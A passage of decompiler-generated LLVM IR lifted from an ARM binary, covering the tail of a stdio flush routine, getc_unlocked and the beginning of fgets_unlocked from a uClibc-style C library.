dec_label_pc_1cf6c:                               ; preds = %dec_label_pc_1cf9c.dec_label_pc_1cf6c_crit_edge, %dec_label_pc_1cf64
  %v0_1cf74 = phi i32 [ %v0_1cf74.pre, %dec_label_pc_1cf9c.dec_label_pc_1cf6c_crit_edge ], [ %v1_1cf68, %dec_label_pc_1cf64 ]
  %v0_1cf6c = phi i32 [ %v0_1cf6c.pre, %dec_label_pc_1cf9c.dec_label_pc_1cf6c_crit_edge ], [ %v0_1cf68, %dec_label_pc_1cf64 ]
  %v1_1cf6c = add i32 %v0_1cf6c, 56
  %v2_1cf6c = inttoptr i32 %v1_1cf6c to i32*
  %v3_1cf6c = load i32, i32* %v2_1cf6c, align 4
  store i32 %v3_1cf6c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1cf74, i32* %r2.global-to-local, align 4
  %v1_1cf7897 = inttoptr i32 %v0_1cf74 to i32*
  %v2_1cf7898 = load i32, i32* %v1_1cf7897, align 4
  store i32 %v2_1cf7898, i32* %r3.global-to-local, align 4
  %v3_1cf7c100 = icmp uge i32 %v2_1cf7898, %v3_1cf6c
  store i1 %v3_1cf7c100, i1* %cpsr_c.global-to-local, align 1
  %v9_1cf7c106 = icmp eq i32 %v2_1cf7898, %v3_1cf6c
  br i1 %v9_1cf7c106, label %dec_label_pc_1cf84, label %dec_label_pc_1cf9c

dec_label_pc_1cf84:                               ; preds = %dec_label_pc_1cf6c, %dec_label_pc_1cf84.dec_label_pc_1cf78_crit_edge
  %v0_1cf84107 = phi i32 [ %v1_1cf7c.pre, %dec_label_pc_1cf84.dec_label_pc_1cf78_crit_edge ], [ %v3_1cf6c, %dec_label_pc_1cf6c ]
  store i32 %v0_1cf84107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1cf94 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1cf94, label %dec_label_pc_1cf98, label %dec_label_pc_1cf84.dec_label_pc_1cf78_crit_edge

dec_label_pc_1cf84.dec_label_pc_1cf78_crit_edge:  ; preds = %dec_label_pc_1cf84
  %v0_1cf78.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1cf7c.pre = load i32, i32* @r4, align 4
  %v1_1cf78 = inttoptr i32 %v0_1cf78.pre to i32*
  %v2_1cf78 = load i32, i32* %v1_1cf78, align 4
  store i32 %v2_1cf78, i32* %r3.global-to-local, align 4
  %v3_1cf7c = icmp uge i32 %v2_1cf78, %v1_1cf7c.pre
  store i1 %v3_1cf7c, i1* %cpsr_c.global-to-local, align 1
  %v9_1cf7c = icmp eq i32 %v2_1cf78, %v1_1cf7c.pre
  br i1 %v9_1cf7c, label %dec_label_pc_1cf84, label %dec_label_pc_1cf9c

dec_label_pc_1cf98:                               ; preds = %dec_label_pc_1cf84
  %v0_1cf98 = load i32, i32* @r4, align 4
  store i32 %v0_1cf98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cf9c

dec_label_pc_1cf9c:                               ; preds = %dec_label_pc_1cf6c, %dec_label_pc_1cf84.dec_label_pc_1cf78_crit_edge, %dec_label_pc_1cf98
  %v0_1cfa4 = phi i32 [ %v0_1cf98, %dec_label_pc_1cf98 ], [ %v2_1cf7898, %dec_label_pc_1cf6c ], [ %v2_1cf78, %dec_label_pc_1cf84.dec_label_pc_1cf78_crit_edge ]
  %v1_1cf9c = phi i32 [ %v0_1cf98, %dec_label_pc_1cf98 ], [ %v3_1cf6c, %dec_label_pc_1cf6c ], [ %v1_1cf7c.pre, %dec_label_pc_1cf84.dec_label_pc_1cf78_crit_edge ]
  %v3_1cf9c = icmp uge i32 %v0_1cfa4, %v1_1cf9c
  store i1 %v3_1cf9c, i1* %cpsr_c.global-to-local, align 1
  %v9_1cf9c = icmp eq i32 %v0_1cfa4, %v1_1cf9c
  br i1 %v9_1cf9c, label %dec_label_pc_1cfa4, label %dec_label_pc_1cf9c.dec_label_pc_1cf6c_crit_edge

dec_label_pc_1cf9c.dec_label_pc_1cf6c_crit_edge:  ; preds = %dec_label_pc_1cf9c
  %v0_1cf6c.pre = load i32, i32* @r5, align 4
  %v0_1cf74.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1cf6c

dec_label_pc_1cfa4:                               ; preds = %dec_label_pc_1cf9c
  %v2_1cfa4 = icmp ne i32 %v1_1cf9c, 0
  store i1 %v2_1cfa4, i1* %cpsr_c.global-to-local, align 1
  %v7_1cfa8 = icmp slt i32 %v1_1cf9c, 2
  br i1 %v7_1cfa8, label %dec_label_pc_1cfc4, label %dec_label_pc_1cfac

dec_label_pc_1cfac:                               ; preds = %dec_label_pc_1cfa4
  %v0_1cfac = load i32, i32* @r5, align 4
  %v1_1cfac = add i32 %v0_1cfac, 56
  store i32 %v1_1cfac, i32* %r0.global-to-local, align 4
  %v0_1cfb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cfb0 = add i32 %v0_1cfb0, 129
  store i32 %v1_1cfb0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1cfc4

dec_label_pc_1cfc4:                               ; preds = %dec_label_pc_1cf50, %dec_label_pc_1cfac, %dec_label_pc_1cfa4, %bb71, %dec_label_pc_1ce8c
  %v0_1cfc4 = load i32, i32* @r5, align 4
  %v1_1cfc4 = add i32 %v0_1cfc4, 32
  %v2_1cfc4 = inttoptr i32 %v1_1cfc4 to i32*
  %v3_1cfc4 = load i32, i32* %v2_1cfc4, align 4
  store i32 %v3_1cfc4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cfc8 = icmp eq i32 %v3_1cfc4, 0
  br i1 %v2_1cfc8, label %dec_label_pc_1cfd0, label %dec_label_pc_1ce8c

dec_label_pc_1cfd0:                               ; preds = %dec_label_pc_1cfc4, %dec_label_pc_1ce7c
  %v0_1cfd0 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_1cfd0, i32* %r0.global-to-local, align 4
  %v0_1d00c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_1cfd8:                               ; preds = %dec_label_pc_1ccb4
  %v3_1cfd8 = load i16, i16* %arg1, align 2
  %v4_1cfd8 = zext i16 %v3_1cfd8 to i32
  %v1_1cfdc = and i32 %v4_1cfd8, 64
  store i32 %v1_1cfdc, i32* %r3.global-to-local, align 4
  %v2_1cfdc = icmp eq i32 %v1_1cfdc, 0
  br i1 %v2_1cfdc, label %bb72, label %dec_label_pc_1cfe8

bb72:                                             ; preds = %dec_label_pc_1cfd8
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_1cfe8:                               ; preds = %dec_label_pc_1cfd8
  %v0_1cfe8 = call i32 @__stdio_wcommit()
  store i32 %v0_1cfe8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1cfec = icmp eq i32 %v0_1cfe8, 0
  br i1 %v2_1cfec, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_1cfe8
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_1cfe8
  %v1_1cff0 = load i32, i32* @r4, align 4
  %v2_1cff0 = inttoptr i32 %v1_1cff0 to i16*
  %v3_1cff0 = load i16, i16* %v2_1cff0, align 2
  %v4_1cff0 = zext i16 %v3_1cff0 to i32
  store i32 %v4_1cff0, i32* %r3.global-to-local, align 4
  %v2_1cff4 = add i32 %v1_1cff0, 8
  %v3_1cff4 = inttoptr i32 %v2_1cff4 to i32*
  %v4_1cff4 = load i32, i32* %v3_1cff4, align 4
  store i32 %v4_1cff4, i32* %r2.global-to-local, align 4
  %v2_1cff8 = and i32 %v4_1cff0, 65471
  store i32 %v2_1cff8, i32* %r3.global-to-local, align 4
  %v2_1cffc = trunc i32 %v2_1cff8 to i16
  store i16 %v2_1cffc, i16* %v2_1cff0, align 2
  %v1_1d000 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d000 = load i32, i32* @r4, align 4
  %v3_1d000 = add i32 %v2_1d000, 28
  %v4_1d000 = inttoptr i32 %v3_1d000 to i32*
  store i32 %v1_1d000, i32* %v4_1d000, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_1cfd0, %.thread14
  %v0_1d00c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1d00c.pre, %dec_label_pc_1cfd0 ], [ 0, %.thread14 ]
  store i32 %v0_1d00c, i32* %r0.global-to-local, align 4
  store i32 %v6_1cc88, i32* %r5.global-to-local, align 4
  ret i32 %v0_1d00c

; uselistorder directives
  uselistorder i32 %v0_1d00c, { 1, 0 }
  uselistorder i32 %v3_1cfc4, { 1, 2, 0 }
  uselistorder i32 %v0_1cf98, { 1, 0, 2 }
  uselistorder i32 %v1_1cf7c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1cee4, { 1, 0, 2 }
  uselistorder i32 %v1_1cec8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1ceac, { 1, 0 }
  uselistorder i32 %v0_1ce50, { 1, 0, 2 }
  uselistorder i32 %v1_1ce34.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1ce24, { 1, 0 }
  uselistorder i32 %v0_1cde8, { 1, 0, 2 }
  uselistorder i32 %v1_1cdcc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1cdb4, { 1, 0 }
  uselistorder i32 %v0_1cd7c, { 1, 0, 2 }
  uselistorder i32 %v1_1cd60.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1cd50, { 1, 0 }
  uselistorder i32 %v0_1cd0c, { 1, 0, 2 }
  uselistorder i32 %v1_1ccf0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_1ccc8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 51, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 50, 19, 20, 21, 22, 23, 24, 26, 25, 52, 27, 28, 29, 30, 32, 31, 53, 33, 34, 35, 36, 38, 37, 54, 39, 40, 41, 42, 44, 43, 55, 45, 46, 49, 47, 48 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 12, 2, 3, 4, 31, 32, 5, 6, 7, 8, 9, 29, 30, 10, 11, 0, 13, 14, 15, 33, 34, 16, 17, 18, 35, 36, 19, 20, 21, 22, 37, 38, 23, 24, 25, 39, 40, 26, 27, 28 }
  uselistorder i32 168, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 11, 13, 12, 14, 17, 15, 18, 16, 19, 0, 20, 21 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1cfc4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1cf9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cf84, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cf04, { 1, 0 }
  uselistorder label %dec_label_pc_1cef8, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_1cee8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ced0, { 1, 0 }
  uselistorder label %dec_label_pc_1ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_1ce7cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_1ce54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ce3c, { 1, 0 }
  uselistorder label %dec_label_pc_1cdfc, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1cdec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cdd4, { 1, 0 }
  uselistorder label %dec_label_pc_1cda8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1cd80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cd68, { 1, 0 }
  uselistorder label %dec_label_pc_1cd20, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_1cd10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ccf8, { 1, 0 }
  uselistorder label %dec_label_pc_1ccc4, { 1, 0 }
}

define i32 @function_1d020(i16* %arg1) local_unnamed_addr {
dec_label_pc_1d020:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1d020 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1d020, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_1d020
  %v2_1d020 = load i32, i32* @r8, align 4
  %v8_1d020 = ashr i32 %v2_1d020, %tmp
  %v9_1d020 = and i32 %v8_1d020, %tmp
  %v2_1d024 = trunc i32 %v9_1d020 to i16
  %v4_1d024 = inttoptr i32 %v9_1d020 to i16*
  store i16 %v2_1d024, i16* %v4_1d024, align 2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1d020, %bb
  %v5_1d030 = phi i32 [ %tmp, %dec_label_pc_1d020 ], [ 0, %bb ]
  ret i32 %v5_1d030

; uselistorder directives
  uselistorder i32 %v9_1d020, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_1d034 = load i32, i32* @r4, align 4
  store i32 %v3_1d034, i32* %stack_var_-12, align 4
  %v6_1d034 = load i32, i32* @r5, align 4
  %v9_1d034 = load i32, i32* @lr, align 4
  %v0_1d038 = load i32, i32* @r0, align 4
  %v1_1d038 = add i32 %v0_1d038, 16
  %v2_1d038 = inttoptr i32 %v1_1d038 to i32*
  %v3_1d038 = load i32, i32* %v2_1d038, align 4
  store i32 %v3_1d038, i32* %r2.global-to-local, align 4
  %v1_1d03c = add i32 %v0_1d038, 24
  %v2_1d03c = inttoptr i32 %v1_1d03c to i32*
  %v3_1d03c = load i32, i32* %v2_1d03c, align 4
  %v3_1d040 = icmp ult i32 %v3_1d038, %v3_1d03c
  store i32 %v0_1d038, i32* @r4, align 4
  br i1 %v3_1d040, label %bb, label %dec_label_pc_1d060

bb:                                               ; preds = %entry
  %v2_1d04c = inttoptr i32 %v3_1d038 to i8*
  %v3_1d04c = load i8, i8* %v2_1d04c, align 1
  %v4_1d04c = zext i8 %v3_1d04c to i32
  store i32 %v4_1d04c, i32* %r0.global-to-local, align 4
  %v6_1d04c = add i32 %v3_1d038, 1
  store i32 %v6_1d04c, i32* %r2.global-to-local, align 4
  store i32 %v6_1d04c, i32* %v2_1d038, align 4
  br label %dec_label_pc_1d14c

dec_label_pc_1d060:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r5, align 4
  %v1_1d060 = inttoptr i32 %v0_1d038 to i16*
  %v2_1d060 = load i16, i16* %v1_1d060, align 2
  %v3_1d060 = zext i16 %v2_1d060 to i32
  %v1_1d064 = and i32 %v3_1d060, 131
  %tmp25 = icmp ugt i32 %v1_1d064, 128
  br i1 %tmp25, label %dec_label_pc_1d080, label %dec_label_pc_1d070

dec_label_pc_1d070:                               ; preds = %dec_label_pc_1d060
  store i32 128, i32* @r1, align 4
  %v0_1d074 = call i32 @__stdio_trans2r_o()
  store i32 %v0_1d074, i32* %r0.global-to-local, align 4
  %v2_1d078 = icmp eq i32 %v0_1d074, 0
  br i1 %v2_1d078, label %dec_label_pc_1d070.dec_label_pc_1d080_crit_edge, label %dec_label_pc_1d148

dec_label_pc_1d070.dec_label_pc_1d080_crit_edge:  ; preds = %dec_label_pc_1d070
  %v0_1d080.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1d080

dec_label_pc_1d080:                               ; preds = %dec_label_pc_1d070.dec_label_pc_1d080_crit_edge, %dec_label_pc_1d060
  %v2_1d0c0 = phi i32 [ %v0_1d080.pre, %dec_label_pc_1d070.dec_label_pc_1d080_crit_edge ], [ %v0_1d038, %dec_label_pc_1d060 ]
  %v1_1d080 = inttoptr i32 %v2_1d0c0 to i16*
  %v2_1d080 = load i16, i16* %v1_1d080, align 2
  %v3_1d080 = zext i16 %v2_1d080 to i32
  store i32 %v3_1d080, i32* %r2.global-to-local, align 4
  %v1_1d084 = and i32 %v3_1d080, 2
  %v2_1d084 = icmp eq i32 %v1_1d084, 0
  br i1 %v2_1d084, label %dec_label_pc_1d0b0, label %dec_label_pc_1d08c

dec_label_pc_1d08c:                               ; preds = %dec_label_pc_1d080
  %tmp26 = urem i16 %v2_1d080, 2
  %v1_1d08c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1d08c
  %v4_1d090 = and i32 %tmp22, 4
  %v5_1d090 = add i32 %v4_1d090, %v2_1d0c0
  %v1_1d094 = add i32 %v5_1d090, 36
  %v2_1d094 = inttoptr i32 %v1_1d094 to i8*
  %v3_1d094 = load i8, i8* %v2_1d094, align 1
  %v4_1d094 = zext i8 %v3_1d094 to i32
  %v1_1d098 = add nsw i32 %v3_1d080, -1
  store i32 %v1_1d098, i32* %r2.global-to-local, align 4
  store i32 %v4_1d094, i32* %r0.global-to-local, align 4
  %v2_1d0a4 = add i32 %v2_1d0c0, 40
  %v3_1d0a4 = inttoptr i32 %v2_1d0a4 to i32*
  store i32 0, i32* %v3_1d0a4, align 4
  %v0_1d0a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d0a8 = trunc i32 %v0_1d0a8 to i16
  %v2_1d0a8 = load i32, i32* @r4, align 4
  %v3_1d0a8 = inttoptr i32 %v2_1d0a8 to i16*
  store i16 %v1_1d0a8, i16* %v3_1d0a8, align 2
  br label %dec_label_pc_1d14c

dec_label_pc_1d0b0:                               ; preds = %dec_label_pc_1d080
  %v1_1d0b0 = add i32 %v2_1d0c0, 16
  %v1_1d0b4 = inttoptr i32 %v1_1d0b0 to i32*
  %v2_1d0b4 = load i32, i32* %v1_1d0b4, align 4
  store i32 %v2_1d0b4, i32* @r1, align 4
  %v3_1d0b4 = add i32 %v2_1d0c0, 20
  %v4_1d0b4 = inttoptr i32 %v3_1d0b4 to i32*
  %v5_1d0b4 = load i32, i32* %v4_1d0b4, align 4
  %v9_1d0b8 = icmp eq i32 %v5_1d0b4, %v2_1d0b4
  br i1 %v9_1d0b8, label %dec_label_pc_1d0c8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1d0b0
  %v2_1d0bc = inttoptr i32 %v2_1d0b4 to i8*
  %v3_1d0bc = load i8, i8* %v2_1d0bc, align 1
  %v4_1d0bc = zext i8 %v3_1d0bc to i32
  store i32 %v4_1d0bc, i32* %r0.global-to-local, align 4
  %v6_1d0bc = add i32 %v2_1d0b4, 1
  store i32 %v6_1d0bc, i32* @r1, align 4
  store i32 %v6_1d0bc, i32* %v1_1d0b4, align 4
  br label %dec_label_pc_1d14c

dec_label_pc_1d0c8:                               ; preds = %dec_label_pc_1d0b0
  %v1_1d0c8 = add i32 %v2_1d0c0, 4
  %v2_1d0c8 = inttoptr i32 %v1_1d0c8 to i32*
  %v3_1d0c8 = load i32, i32* %v2_1d0c8, align 4
  %v7_1d0cc = icmp eq i32 %v3_1d0c8, -2
  br i1 %v7_1d0cc, label %.thread7, label %dec_label_pc_1d0e0

.thread7:                                         ; preds = %dec_label_pc_1d0c8
  %v2_1d0d0 = or i16 %v2_1d080, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_1d0d0, i16* %v1_1d080, align 2
  br label %dec_label_pc_1d14c

dec_label_pc_1d0e0:                               ; preds = %dec_label_pc_1d0c8
  %v1_1d0e0 = and i32 %v3_1d080, 768
  %v2_1d0e0 = icmp eq i32 %v1_1d0e0, 0
  br i1 %v2_1d0e0, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_1d0e0
  %v1_1d0e8 = load i32, i32* @r5, align 4
  %v3_1d0e8 = add i32 %v1_1d0e8, 88
  %v4_1d0e8 = inttoptr i32 %v3_1d0e8 to i32*
  %v5_1d0e8 = load i32, i32* %v4_1d0e8, align 4
  store i32 %v5_1d0e8, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1d0e0, %bb23
  store i32 119024, i32* @lr, align 4
  %v1_1d0ec = xor i1 %v2_1d0e0, true
  call void @__pseudo_cond_branch(i1 %v1_1d0ec, i32 ptrtoint (i32* @global_var_1cc88.1700 to i32))
  %v0_1d0f0 = load i32, i32* @r4, align 4
  %v1_1d0f0 = add i32 %v0_1d0f0, 8
  store i32 %v1_1d0f0, i32* %r2.global-to-local, align 4
  %v1_1d0f4 = inttoptr i32 %v1_1d0f0 to i32*
  %v2_1d0f4 = load i32, i32* %v1_1d0f4, align 4
  store i32 %v2_1d0f4, i32* %r2.global-to-local, align 4
  %v3_1d0f4 = add i32 %v0_1d0f0, 12
  %v4_1d0f4 = inttoptr i32 %v3_1d0f4 to i32*
  %v5_1d0f4 = load i32, i32* %v4_1d0f4, align 4
  %v9_1d0f8 = icmp eq i32 %v5_1d0f4, %v2_1d0f4
  br i1 %v9_1d0f8, label %dec_label_pc_1d12c, label %dec_label_pc_1d100

dec_label_pc_1d100:                               ; preds = %.thread9
  %v2_1d100 = add i32 %v0_1d0f0, 24
  %v3_1d100 = inttoptr i32 %v2_1d100 to i32*
  store i32 %v2_1d0f4, i32* %v3_1d100, align 4
  %v0_1d104 = load i32, i32* @r4, align 4
  store i32 %v0_1d104, i32* %r0.global-to-local, align 4
  %v2_1d108 = call i32 @__stdio_rfill(i32 %v0_1d104)
  store i32 %v2_1d108, i32* %r0.global-to-local, align 4
  %v2_1d10c = icmp eq i32 %v2_1d108, 0
  br i1 %v2_1d10c, label %dec_label_pc_1d148, label %dec_label_pc_1d114

dec_label_pc_1d114:                               ; preds = %dec_label_pc_1d100
  %v0_1d114 = load i32, i32* @r4, align 4
  %v1_1d114 = add i32 %v0_1d114, 20
  %v2_1d114 = inttoptr i32 %v1_1d114 to i32*
  %v3_1d114 = load i32, i32* %v2_1d114, align 4
  %v2_1d118 = add i32 %v0_1d114, 24
  %v3_1d118 = inttoptr i32 %v2_1d118 to i32*
  store i32 %v3_1d114, i32* %v3_1d118, align 4
  %v0_1d11c = load i32, i32* @r4, align 4
  %v1_1d11c = add i32 %v0_1d11c, 16
  %v2_1d11c = inttoptr i32 %v1_1d11c to i32*
  %v3_1d11c = load i32, i32* %v2_1d11c, align 4
  %v1_1d120 = inttoptr i32 %v3_1d11c to i8*
  %v2_1d120 = load i8, i8* %v1_1d120, align 1
  %v3_1d120 = zext i8 %v2_1d120 to i32
  store i32 %v3_1d120, i32* %r0.global-to-local, align 4
  %v5_1d120 = add i32 %v3_1d11c, 1
  store i32 %v5_1d120, i32* %v2_1d11c, align 4
  br label %dec_label_pc_1d14c

dec_label_pc_1d12c:                               ; preds = %.thread9
  %v1_1d12c = inttoptr i32 %v0_1d0f0 to i16*
  store i32 %v0_1d0f0, i32* %r0.global-to-local, align 4
  %v2_1d130 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_1d130, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1d138 = call i32 @__stdio_READ(i16* %v1_1d12c, i32 %v2_1d130, i32 1)
  store i32 %v5_1d138, i32* %r0.global-to-local, align 4
  %v2_1d13c = icmp eq i32 %v5_1d138, 0
  br i1 %v2_1d13c, label %dec_label_pc_1d148, label %bb24

bb24:                                             ; preds = %dec_label_pc_1d12c
  %v4_1d140 = load i8, i8* %stack_var_-17, align 1
  %v5_1d140 = sext i8 %v4_1d140 to i32
  store i32 %v5_1d140, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d14c

dec_label_pc_1d148:                               ; preds = %dec_label_pc_1d12c, %dec_label_pc_1d070, %dec_label_pc_1d100
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d14c

dec_label_pc_1d14c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_1d114, %dec_label_pc_1d08c, %dec_label_pc_1d148
  %v2_1d150 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1d150, i32* @r4, align 4
  store i32 %v6_1d034, i32* @r5, align 4
  store i32 %v9_1d034, i32* @lr, align 4
  %v1_1d154 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1d154

; uselistorder directives
  uselistorder i32 %v2_1d0b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1d0c0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_1d038, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_1d14c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_1d148, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_1d160 = load i32, i32* @r6, align 4
  %v12_1d160 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d164 = icmp eq i32 %arg2, 0
  store i1 %v2_1d164, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1d1ec, label %dec_label_pc_1d1d4.preheader

dec_label_pc_1d1d4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_1d1d42 = add i32 %arg2, -1
  store i32 %v1_1d1d42, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1d1d48 = icmp eq i32 %arg2, 1
  store i1 %v7_1d1d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d1d48, label %dec_label_pc_1d1dc, label %dec_label_pc_1d180

dec_label_pc_1d180:                               ; preds = %dec_label_pc_1d1d4.preheader, %dec_label_pc_1d1d4.backedge.dec_label_pc_1d180_crit_edge
  %v0_1d1a4 = phi i32 [ %v0_1d180.pre, %dec_label_pc_1d1d4.backedge.dec_label_pc_1d180_crit_edge ], [ %arg3, %dec_label_pc_1d1d4.preheader ]
  %v1_1d180 = add i32 %v0_1d1a4, 16
  %v2_1d180 = inttoptr i32 %v1_1d180 to i32*
  %v3_1d180 = load i32, i32* %v2_1d180, align 4
  store i32 %v3_1d180, i32* %r2.global-to-local, align 4
  %v1_1d184 = add i32 %v0_1d1a4, 24
  %v2_1d184 = inttoptr i32 %v1_1d184 to i32*
  %v3_1d184 = load i32, i32* %v2_1d184, align 4
  store i32 %v3_1d184, i32* %r3.global-to-local, align 4
  %v3_1d188 = icmp uge i32 %v3_1d180, %v3_1d184
  store i1 %v3_1d188, i1* %cpsr_c.global-to-local, align 1
  %v9_1d188 = icmp eq i32 %v3_1d180, %v3_1d184
  store i1 %v9_1d188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1d188, label %dec_label_pc_1d1a4, label %dec_label_pc_1d190

dec_label_pc_1d190:                               ; preds = %dec_label_pc_1d180
  %v1_1d190 = inttoptr i32 %v3_1d180 to i8*
  %v2_1d190 = load i8, i8* %v1_1d190, align 1
  %v3_1d190 = zext i8 %v2_1d190 to i32
  store i32 %v3_1d190, i32* %r3.global-to-local, align 4
  %v5_1d190 = add i32 %v3_1d180, 1
  store i32 %v5_1d190, i32* %r2.global-to-local, align 4
  %v2_1d194 = load i32, i32* @r5, align 4
  %v3_1d194 = inttoptr i32 %v2_1d194 to i8*
  store i8 %v2_1d190, i8* %v3_1d194, align 1
  %v4_1d194 = load i32, i32* @r5, align 4
  %v5_1d194 = add i32 %v4_1d194, 1
  store i32 %v5_1d194, i32* @r5, align 4
  %v0_1d198 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d198 = icmp ugt i32 %v0_1d198, 9
  store i1 %v2_1d198, i1* %cpsr_c.global-to-local, align 1
  %v7_1d198 = icmp eq i32 %v0_1d198, 10
  store i1 %v7_1d198, i1* %cpsr_z.global-to-local, align 1
  %v0_1d19c = load i32, i32* %r2.global-to-local, align 4
  %v1_1d19c = load i32, i32* @r4, align 4
  %v2_1d19c = add i32 %v1_1d19c, 16
